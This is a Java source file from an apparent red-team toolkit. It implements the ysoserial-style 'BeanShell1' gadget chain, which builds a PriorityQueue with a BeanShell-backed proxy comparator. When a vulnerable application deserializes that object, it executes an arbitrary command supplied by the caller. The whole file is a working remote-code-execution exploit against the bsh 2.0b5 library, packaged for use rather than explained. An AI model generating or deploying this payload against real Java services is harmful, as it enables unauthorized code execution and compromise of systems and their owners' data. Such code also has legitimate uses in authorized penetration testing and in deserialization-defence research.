package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import bsh.Interpreter;
import bsh.NameSpace;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.custom.BeanShellUtil;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    @Override
    public PriorityQueue getObject(String command) throws Exception {
        String payload = BeanShellUtil.getPayload(command);

        Interpreter interpreter = new Interpreter();
        Method setu = interpreter.getClass().getDeclaredMethod("setu", new Class[]{String.class, Object.class});
        setu.setAccessible(true);
        setu.invoke(interpreter, new Object[]{"bsh.cwd", "."});
        interpreter.eval(payload);

        Class clsXThis = Class.forName("bsh.XThis");
        Constructor constructor = clsXThis.getDeclaredConstructor(new Class[]{NameSpace.class, Interpreter.class});
        constructor.setAccessible(true);
        Object xThis = constructor.newInstance(new Object[]{interpreter.getNameSpace(), interpreter});
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xThis.getClass(), "invocationHandler").get(xThis);

        Comparator comparator = (Comparator) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(),
                new Class<?>[]{Comparator.class},
                handler
        );

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{1, 1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(BeanShell1.class, args);
    }
}
